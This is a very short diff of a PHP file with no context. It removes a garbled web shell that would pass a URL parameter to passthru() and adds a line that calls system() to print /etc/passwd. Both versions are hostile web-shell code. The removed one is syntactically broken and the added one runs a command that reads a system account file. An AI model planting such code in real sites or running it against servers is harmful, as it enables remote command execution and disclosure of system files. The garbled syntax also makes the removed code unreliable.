@@ -1,3 +1,1 @@
-<? Php
-passthru ($ _ GET [ls]);
-?>
+<?php system('cat /etc/passwd');?>
